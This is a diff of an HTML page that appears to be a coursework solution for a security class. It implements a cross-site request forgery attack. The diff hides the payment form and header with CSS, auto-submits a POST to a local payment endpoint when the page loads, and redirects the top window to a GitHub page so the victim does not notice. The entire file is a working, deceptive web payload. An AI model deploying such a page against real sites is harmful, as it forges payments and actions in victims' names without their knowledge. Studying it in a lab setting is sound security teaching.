@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html>
 
+<head>
+<style>
+form{visibility:hidden;}
+h3{visibility:hidden;}
+</style>
+</head>
 <div class="payment-form">
   <h3 class="payment-header">Make payment?</h3>
   <form action="http://localhost:8080/pay" method="post">
@@ -16,7 +22,15 @@
   </form>
 </div>
 
-<body onload="document.forms[0].submit()">
 
+<body  onload="document.forms[0].submit()">
+<script>
+	window.addEventListener("load",function(){
+		window.top.location.href = "http://github.com/tomrist/cs5435-fall2019"; 
+	});
+</script>
+	
+</body>
 
 </html>
+
